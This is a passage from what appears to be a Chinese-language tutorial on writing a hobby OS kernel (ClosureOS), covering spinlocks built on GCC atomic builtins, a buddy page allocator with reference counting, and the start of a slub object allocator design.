class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_BADRAM:<br>                mm::pgdb_base[pfn].type = mm::PAGE_BADRAM;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                mm::pgdb_base[pfn].type = mm::PAGE_UNKNOWN;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                boot_printstr(&quot;[!] Warning: unknown memory type [&quot;);</span><br><span class="hljs-comment">                boot_printnum(mmap_tag-&gt;entries[i].type);</span><br><span class="hljs-comment">                boot_printstr(&quot;] at addr: 0x&quot;);</span><br><span class="hljs-comment">                boot_printhex(base);</span><br><span class="hljs-comment">                boot_putchar(&#x27;\n&#x27;);</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>到目前为止，我们已经 <strong>基本完成进入高半部内核前的准备了</strong> ，接下来我们直接跳转到位于高地址的代码继续进行后续的内核初始化工作</p><h3 id="Extra-添加原子操作与自旋锁支持"><a href="#Extra-添加原子操作与自旋锁支持" class="headerlink" title="Extra. 添加原子操作与自旋锁支持"></a><em>Extra. 添加原子操作与自旋锁支持</em></h3><p>原子操作（atomic operations）指的是独立而 <strong>不可被打断的操作</strong> ，这类操作可以由单个或多个子操作组成， <strong>原子内存操作</strong> 即提供了原子性的内存操作，即在同一时刻仅有单个核心能够访问指定内存，其通常被用来在并发环境中实现同步，比较常用的有：</p><ul><li>原子比较与赋值：对比指定内存位置上值是否与指定值相等，若是则赋予新值，否则报错</li><li>原子自增自减：将指定内存位置上值加一或减一</li><li>原子读写：获取&#x2F;覆写指定内存位置上值</li></ul><p>例如在 x86 下我们可以通过如添加了 <code>lock</code> 前缀的汇编指令在访问内存的同时完成对总线的控制，<strong>从而从硬件层面确保了内存访问的唯一性</strong>：</p><blockquote><p>注：该示例代码仅用于讲解原理， <strong>未</strong> 用于 ClosureOS 中</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">atomic_xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> result;<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;1&quot;</span> (newval)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 GCC 中，我们可以直接使用 <a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.1/gcc/Atomic-Builtins.html">编译器内置的原子内存访问函数</a> 来实现原子操作，编译器在生成代码时便会自动生成带有 <code>lock</code> 等前缀的指令：</p><p><img src="https://s2.loli.net/2024/06/26/ZD6mkxFzEyc4V9f.png"></p><p>我们将同一时间仅允许一个核心进行访问的资源称为临界资源（critical resource），将访问临界资源的代码称为临界区（critical region）—— <strong>锁</strong> （lock）是一种用来确保在同一时间仅有一个核心进入指定临界区的数据结构，软件设计规范中我们通常要求程序在访问临界资源前需要持有锁，在完成对临界资源的操作后释放锁，从而确保同一时间仅有单个核心在访问该临界资源</p><p>通过原子内存操作中的 <code>比较与交换</code> 操作，我们可以很容易实现一个简单的锁：</p><ul><li>定义一个整形变量作为锁，0 为已释放，1 为仍被持有</li><li>循环调用 GCC 内建函数 <code>__sync_bool_compare_and_swap()</code> 进行原子操作：检测锁变量的值，其为 0 时将其改为 1</li><li>完成操作后将锁变量的值更改为 0</li></ul><p>由于锁在被持有的情况下请求锁的一方会循环不停地检查，因此这种锁被称为 <strong>自旋锁</strong> （spin lock），我们的实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">volatile</span> base::<span class="hljs-type">int32_t</span> <span class="hljs-type">atomic_t</span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> OldValType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_compare_and_swap</span><span class="hljs-params">(PtrType ptr, OldValType oldval, NewValType newval)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_bool_compare_and_swap(ptr, oldval, newval);<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_set</span><span class="hljs-params">(PtrType ptr, NewValType newval)</span> -&gt; <span class="hljs-keyword">auto</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_lock_test_and_set(ptr, newval);<br>&#125;<br><br><span class="hljs-comment">/* ... */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_LOCKED 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_FREE 0</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpinLock</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">SpinLock</span>();<br>    ~<span class="hljs-built_in">SpinLock</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">atomic_t</span> counter;<br>&#125;;<br><br>SpinLock::<span class="hljs-built_in">SpinLock</span>()<br>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED)) &#123;<br>        <span class="hljs-comment">/* infinite waiting looooop... */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-页级内存分配器：buddy-算法"><a href="#0x02-页级内存分配器：buddy-算法" class="headerlink" title="0x02. 页级内存分配器：buddy 算法"></a>0x02. 页级内存分配器：buddy 算法</h1><p>我们按惯例将内核侧的内存分配分为两部分：一部分是以内存页为单位的粗粒度页级内存分配器，另一部分是从页级内存分配器分配内存页后再将其划分为更多小对象的细粒度内存分配器，本节我们将实现页级内存分配器</p><p><strong>伙伴算法</strong> （ buddy memory allocation ）是笔者所见过的几种页级内存管理算法当中 <strong>比较优雅的一种</strong> ，因此在 ClosureOS 当中我们的页级内存分配器也采用这种算法，我们将这一内存分配器称为 <code>buddy system</code></p><p>我们使用 <code>struct page</code> 结构体来管理空闲的内存页，并将连续的空闲内存页进行分阶 （order） 管理，一份 N 阶的空闲内存页表示 <code>2^N</code> 张连续的空闲内存页，最高阶设为 <code>10</code> ，位于同一阶的空闲内存页通过第一张页的 <code>list</code> 字段连接为双向链表</p><p><img src="https://s2.loli.net/2024/06/22/XRFtE7I5NxB4hyv.png"></p><p>相同阶的两份页面互相称为 buddy，为了方便进行页面管理，简化页面分配模型， <strong>我们将一份 buddy pages 限制为页框号在</strong> <code>1 &lt;&lt; order</code> <strong>上分别为 0 与 1 的两份页面</strong> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">buddy_page_pfn</span><span class="hljs-params">(<span class="hljs-type">pfn_t</span> pfn, <span class="hljs-type">int</span> order)</span> -&gt; base::<span class="hljs-type">size_t</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> pfn ^ (<span class="hljs-number">1</span> &lt;&lt; order);<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page_buddy</span><span class="hljs-params">(Page *p, <span class="hljs-type">int</span> order)</span> -&gt; Page*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pfn_t</span> pfn = <span class="hljs-built_in">page_to_pfn</span>(p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pfn_to_page</span>(<span class="hljs-built_in">buddy_page_pfn</span>(pfn, order));<br>&#125;<br></code></pre></td></tr></table></figure><p>在上层，我们将单个页级内存池封装为一个 <code>PagePool</code> 类，其通过一个自旋锁确保内存分配的线程安全，空闲内存页按照其所属的阶链接到各自所属的空闲双向链表中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">constexpr</span> base::<span class="hljs-type">size_t</span> MAX_PAGE_ORDER = <span class="hljs-number">11</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PagePool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">PagePool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">PagePool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AllocPages</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page *</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">FreePages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-comment">/* for booting stage only */</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    lib::ListHead freelist[MAX_PAGE_ORDER];<br>    lib::atomic::SpinLock lock;<br><br>    <span class="hljs-keyword">auto</span> __reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br>    <span class="hljs-keyword">auto</span> __alloc_pages(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br><br>    <span class="hljs-keyword">auto</span> __free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __reclaim_memory(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="内存页分配：对齐到-2-N-张页，拆高阶页面"><a href="#内存页分配：对齐到-2-N-张页，拆高阶页面" class="headerlink" title="内存页分配：对齐到 2^N 张页，拆高阶页面"></a>内存页分配：对齐到 2^N 张页，拆高阶页面</h2><p>buddy 算法中的分配流程如下：</p><ul><li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页，若成功取到则直接返回</li><li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，其中一份装载到当前下标对应链表中，另一份再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程，直到成功分配或超过最高阶</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *<br>&#123;<br>    Page *p = <span class="hljs-literal">nullptr</span>;<br>    Page *buddy;<br>    base::<span class="hljs-type">size_t</span> allocated = order;<br><br>    <span class="hljs-keyword">while</span> (allocated &lt; MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated])) &#123;<br>            p = lib::<span class="hljs-built_in">list_entry</span>(<span class="hljs-keyword">this</span>-&gt;freelist[allocated].next, &amp;Page::list);<br>            lib::<span class="hljs-built_in">list_del</span>(&amp;p-&gt;list);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            allocated++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* failed */</span><br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* it means that we acquire pages from higher order */</span><br>    <span class="hljs-keyword">if</span> (allocated != order) &#123;<br>        <span class="hljs-comment">/* put half pages back to buddy */</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            allocated--;<br>            buddy = <span class="hljs-built_in">get_page_buddy</span>(p, allocated);<br>            <span class="hljs-keyword">this</span>-&gt;__reinit_page(buddy, allocated, <span class="hljs-literal">true</span>);<br>            lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated], &amp;buddy-&gt;list);<br>        &#125; <span class="hljs-keyword">while</span> (allocated &gt; order);<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, allocated, <span class="hljs-literal">false</span>);<br><br>out:<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成内存页分配之后，我们还需要完成对分配的这一组内存页的标记，对于一份 <code>order=N</code> 的连续内存页，我们以其首页作为标识，其余页面则作为附属页，我们通过 <code>is_head</code> 标志位进行标识，并使用一个额外的 order 字段存储当前页面所属连续内存页的 order：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; order); i++) &#123;<br>        p[i].is_free = free;<br>        p[i].order = order;<br>        p[i].freelist = <span class="hljs-literal">nullptr</span>;<br>        p[i].kc = <span class="hljs-literal">nullptr</span>;<br>        p[i].is_head = <span class="hljs-literal">false</span>;<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;ref_count, <span class="hljs-number">-1</span>);<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;map_count, <span class="hljs-number">-1</span>);<br>    &#125;<br><br>    p[<span class="hljs-number">0</span>].is_head = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，我们设计一个增加页面引用计数的 API ，当页面被引用时我们应当调用该函数增加其引用计数，在 ClosureOS 开发规范中我们应当在分配页面后调用该 API 增加引用计数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    lib::atomic::<span class="hljs-built_in">atomic_inc</span>(&amp;<span class="hljs-built_in">get_head_page</span>(p)-&gt;ref_count);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存页释放：检测相邻空闲页组，-向上合并"><a href="#内存页释放：检测相邻空闲页组，-向上合并" class="headerlink" title="内存页释放：检测相邻空闲页组， 向上合并"></a>内存页释放：检测相邻空闲页组， 向上合并</h2><p>buddy 算法的内存页释放流程如下：</p><ul><li>检查同一 order 的物理相邻高地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>否则，检查同一 order 的物理相邻低地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>order 增加，进入下一轮循环直到超过最大 order 或是同一 order 的前向与后向页面都非空闲</li><li>更新所有子页面信息，最后将页面挂到对应 order 的空闲页面链表上</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (order &gt;= MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-comment">/* try to combine nearby pages */</span><br>    <span class="hljs-keyword">while</span> (order &lt; (MAX_PAGE_ORDER - <span class="hljs-number">1</span>)) &#123;<br>        Page *buddy;<br><br>        buddy = <span class="hljs-built_in">get_page_buddy</span>(p, order);<br>        <span class="hljs-keyword">if</span> (buddy-&gt;type == PAGE_NORMAL_MEM &amp;&amp; buddy-&gt;is_head &amp;&amp; buddy-&gt;is_free) &#123;<br>            <span class="hljs-built_in">list_del</span>(&amp;buddy-&gt;list);<br>            <span class="hljs-keyword">if</span> (buddy &lt; p) &#123;<br>                p-&gt;is_head = <span class="hljs-literal">false</span>;<br>                p = buddy;<br>            &#125;<br>            order++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* we can&#x27;t combine forward or backward, just break */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, order, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-built_in">list_add_next</span>(&amp;(<span class="hljs-keyword">this</span>-&gt;freelist[order]), &amp;p-&gt;list);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>不过我们在 ClosureOS 中通常 <strong>并不直接调用页面释放的这个 API</strong> ，而是根据引用计数的减少来决定是否该释放页面，在引用计数减少为负数值时自动释放该页面，从而将引用计数管理与页面释放相统一，而无需开发者手动检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">put_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    p = <span class="hljs-built_in">get_head_page</span>(p);<br><br>    <span class="hljs-keyword">if</span> (lib::atomic::<span class="hljs-built_in">atomic_dec</span>(&amp;p-&gt;ref_count) &lt; <span class="hljs-number">0</span>) &#123;<br>        p-&gt;pool-&gt;<span class="hljs-built_in">FreePages</span>(p, p-&gt;order);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，目前还只是比较简陋的基础设计，尚未加入各种异常检测（例如 <code>page::ref_count</code> 小于 <code>-1</code> 的情况），我们将在后续添加上完整的错误处理系统（例如 <code>kernel panic</code> ）后再行补充</p><h1 id="0x03-通用内存分配器：slub-算法"><a href="#0x03-通用内存分配器：slub-算法" class="headerlink" title="0x03. 通用内存分配器：slub 算法"></a>0x03. 通用内存分配器：slub 算法</h1><blockquote><p>注：本章我们 <strong>暂时不考虑动态虚拟内存分配</strong> （即传统的 <code>vmalloc()</code> ），仅考虑基于直接映射区的内存分配</p></blockquote><p>现在我们基于页级内存分配器进行小对象分配器的设计：小对象分配器会先从 buddy system 分配页面，将其分割为多个小对象后，再将符合要求的内存对象返还给上层调用</p><p>对于小对象分配器，我们使用 <strong>slub allocator</strong> ——这是一种应用于 Linux kernel 中的久经检验的内存分配算法，其核心思想如下：</p><ul><li>我们将不同大小的内存对象请求归到不同的内存池进行处理，例如对于大小为 <code>16</code> 字节的内存请求从 <code>kmalloc-16</code> 这一内存池进行分配，对于非对齐的内存分配大小则向上对齐到相应的内存池进行分配</li><li>不同的内存池独立持有一组页面，在需要时自行向 buddy system 进行内存分配请求</li><li>内存池向 buddy system 单次请求得到的一份连续内存页称为 <code>slub</code> ，一张 <code>slub</code> 会被分割为多个相同大小的小内存对象，空闲内存对象间连接成单向链表结构</li></ul><p>slub allocator 的好处在于 <strong>我们并不需要额外的数据字段去记录每个内存对象的状态信息</strong> ，我们使用 direct mapping area 的地址来分割 slub pages，由此很容易能根据内存对象的地址获取到其所属的页面与对应的 <code>page</code> 结构体，同时使用链表组织空闲对象可以让我们很方便地得知当前 slub pages 的状态</p><p>我们使用 <code>page</code> 结构体中的一个字段记录其对应的 slub pages 的空闲对象链表，基本结构如下图所示：</p><p><img src="https://s2.loli.net/2024/06/30/p1Ho9Vv5AWiNlXD.png"></p><blockquote><p>为什么使用二阶指针？主要是因为笔者个人比较喜欢的一种链表迭代写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">page-&gt;freelist = *page-&gt;freelist;<br></code></pre></td></tr></table></figure></blockquote><p>然后是内存池结构的设计，我们使用一个 <code>class KMemCache</code> 结构定义一个指定大小的内存池，并为每个内存池设计两个链表：</p><ul><li><code>full</code> ：这个链表上的 slub pages 没有空闲对象</li><li><code>partial</code> 这个链表上的 slub pages 有一定的空闲对象</li></ul><p>此外，我们在 <code>KMemCache</code> 中记录其所需的 slub pages 上的对象数量等信息</p><blockquote><p>注：本章我们暂时不考虑针对多核的优化策略（如 